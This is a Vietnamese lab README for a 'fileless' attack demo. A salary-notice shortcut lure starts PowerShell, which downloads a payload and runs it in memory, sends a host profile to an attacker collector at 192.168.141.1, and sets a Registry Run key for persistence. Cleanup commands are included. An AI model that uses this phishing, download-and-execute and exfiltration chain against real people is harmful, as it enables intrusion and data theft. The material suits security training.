# Attacker Web Files

Copy các file trong thư mục này sang máy attacker tại:

```text
C:\Fileless-Lab
```

Sau đó trên máy attacker chạy:

Terminal 1 - host ZIP và payload:

```powershell
cd C:\Fileless-Lab
PowerShell -File .\create_lnk_zip.ps1
python -m http.server 8000 --bind 192.168.141.1
```

Terminal 2 - nhận profile JSON:

```powershell
cd C:\Fileless-Lab
python .\collect_server.py
```

Trên máy nạn nhân mở:

```text
http://192.168.141.1:8000/
```

Luồng demo:

1. Nạn nhân tải `ThongBaoLuong_Q3.zip`.
2. Nạn nhân giải nén và mở `ThongBaoLuong_Q3.lnk`.
3. Shortcut gọi `powershell.exe`.
4. PowerShell tải nội dung `payload.ps1` qua HTTP.
5. Nội dung payload được đưa vào `ScriptBlock` và thực thi trong memory.
6. Payload thu thập thông tin máy không nhạy cảm.
7. Payload gửi JSON profile về attacker qua `POST http://192.168.141.1:8001/collect`.
8. Nếu collector port `8001` không chạy, payload lưu profile vào `%TEMP%\FilelessLab\queue`.
9. Khi có mạng lại, payload gửi các file queue về attacker rồi xóa queue đã gửi thành công.
10. Payload tạo Registry Run key vô hại để mô phỏng persistence và retry.

Lab này không tạo `payload.b64`, không dùng `certutil -decode` và không ghi `payload-decoded.ps1` xuống máy victim.

Collector lưu dữ liệu nhận được tại:

```text
C:\Fileless-Lab\collections
```

Cleanup persistence trên victim:

```powershell
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "FilelessLabDemo" -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\FilelessLab" -Recurse -Force -ErrorAction SilentlyContinue
```
